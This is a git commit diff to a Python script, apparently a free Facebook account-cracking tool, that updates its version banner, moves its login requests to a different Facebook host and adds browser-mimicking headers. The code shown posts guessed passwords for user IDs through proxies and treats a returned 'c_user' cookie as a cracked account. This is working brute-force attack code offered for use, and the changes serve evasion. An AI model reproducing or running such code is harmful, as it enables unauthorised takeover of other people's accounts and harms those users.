dc712af8d019ac0773e1e4bcb8b9b8a1de657e16
MR-KINGX <128972681+MR-KINGX@users.noreply.github.com>
2023-05-19 05:11:10 +0500

    Add files via upload

--- Ok.py
+++ Ok.py
@@ -220,7 +220,7 @@ logo ="""\033[1;32m
 \033[1;32m[+] \033[1;34mON FACEBOK   :  \033[1;34mAB KHANX
 \033[1;32m[+] \033[1;35mON GITHUB    :  \033[1;35mMR-KINGX
 \033[1;32m[+] \033[1;36mTOOL STATUS  :  \033[1;36mFREE
-\033[1;32m[+] \033[1;36mTOOL VIRSION :  \033[1;36m2.5.2
+\033[1;32m[+] \033[1;36mTOOL VIRSION :  \033[1;36m2.5.3
 \033[1;32m[+]==============================================      """
 loop = 0
 oks = []
@@ -304,22 +304,25 @@ def rcrack(uid,pwx,tl):
             "email":uid,
             "pass":ps,
             "login":"Log In"}
-            header_freefb = {'authority':'p.facebook.com',
+            header_freefb = {'authority':'x.facebook.com',
             'method': 'GET',
             'scheme': 'https',
             'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
             'accept-language': 'en-US,en;q=0.9,ur-PK;q=0.8,ur;q=0.7,fa-IR;q=0.6,fa;q=0.5',
             'cache-control': 'max-age=0',
+            'sec-ch-prefers-color-scheme': 'light',
             'sec-ch-ua': '"Not:A-Brand";v="99", "Chromium";v="112"',
+            'sec-ch-ua-full-version-list': '"Not:A-Brand";v="99.0.0.0", "Chromium";v="112.0.5615.137"',
             'sec-ch-ua-mobile': '?1',
             'sec-ch-ua-platform': '"Android"',
+            'sec-ch-ua-platform-version': '"10.0.0"',
             'sec-fetch-dest': 'document',
             'sec-fetch-mode': 'navigate',
             'sec-fetch-site': 'none',
             'sec-fetch-user': '?1',
             'upgrade-insecure-requests': '1',
             'user-agent': 'Mozilla/5.0 (Mobile; rv:48.0; A405DL) Gecko/48.0 Firefox/48.0 KAIOS/2.5',}
-            lo = session.post('https://p.facebook.com/login/device-based/regular/login/?refsrc',data=log_data,headers=header_freefb,proxies=proxs).text
+            lo = session.post('https://x.facebook.com/login/device-based/regular/login/?refsrc',data=log_data,headers=header_freefb,proxies=proxs).text
             log_cookies=session.cookies.get_dict().keys()
             #print(iid+'|'+pws+'|'+str(log_cookies))
             if 'c_user' in log_cookies:
